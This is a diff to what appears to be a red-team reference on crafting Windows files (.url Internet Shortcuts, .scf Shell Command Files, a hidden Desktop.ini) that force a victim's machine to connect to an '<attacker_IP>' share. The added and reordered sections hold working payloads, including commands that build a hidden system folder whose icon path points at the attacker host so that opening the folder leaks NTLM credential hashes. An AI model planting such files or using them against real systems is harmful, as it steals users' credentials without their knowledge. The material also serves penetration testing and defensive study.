@@ -74,14 +74,7 @@ Name it with `.jnlp` extension.
 
 ## 05 - Internet Shortcut File
 
-WebDAV link.
-
-```
-[InternetShortcut]
-URL=file://<attacker_IP>/@snare
-```
-
-SMB link.
+SMB link and name it with `.url` extension.
 
 ```
 [InternetShortcut]
@@ -90,7 +83,16 @@ IconIndex=0
 IconFile=\\<attacker_IP>\snare\file.ico
 ```
 
+WebDAV link.
+
+```
+[InternetShortcut]
+URL=file://<attacker_IP>/@snare
+```
+
 ## 06 - Shell Command Files
+
+Name it with `.scf` extension.
 
 ```
 [Shell]
@@ -100,7 +102,20 @@ IconFile=\\<attacker_IP>\snare\file.ico
 Command=ToggleDesktop
 ```
 
-## 07 - Windows Media Player
+## 07 - Desktop.ini
+
+Name it with `.ini` extension.
+
+```
+C:\> mkdir openMe
+attrib +s openMe
+cd openMe
+echo [.ShellClassInfo] > desktop.ini
+echo IconResource=\\<attacker_IP>\snare >> desktop.ini
+attrib +s +h desktop.ini
+```
+
+## 08 - Windows Media Player
 
 Name it with `.m3u` extension.
 
